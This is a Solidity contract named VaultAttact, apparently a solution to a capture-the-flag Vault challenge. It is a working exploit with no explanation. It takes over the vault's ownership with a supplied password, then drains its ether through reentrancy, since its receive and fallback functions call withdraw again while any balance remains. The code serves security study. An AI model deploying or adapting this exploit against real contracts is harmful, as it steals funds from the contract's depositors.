// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function withdraw() external;
    function openWithdraw() external;
    function deposite() external payable;
}
contract VaultAttact {
    address public vaultAddr;

    event checkBalance(uint256 balance);
    constructor(address _vaultAddr) {
        vaultAddr = _vaultAddr;
    }

    function changeVaultOwner(bytes32 _password) public {
        (bool success, ) = vaultAddr.call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)",
                _password,
                address(this)
            )
        );

        require(success, "failed change owner");
    }

    function depositEthtoVault() public payable {
        emit checkBalance(address(this).balance);
        IVault(vaultAddr).deposite{value: msg.value}();
        emit checkBalance(address(this).balance);
    }

    function withdrawFromVault() public {
        IVault(vaultAddr).openWithdraw();
        if (vaultAddr.balance > 0) {
            IVault(vaultAddr).withdraw();
        }
    }

    receive() external payable {
        if (address(vaultAddr).balance > 0) {
            IVault(vaultAddr).withdraw();
        }
    }

    fallback() external payable {
        if (address(vaultAddr).balance > 0) {
            IVault(vaultAddr).withdraw();
        }
    }
}
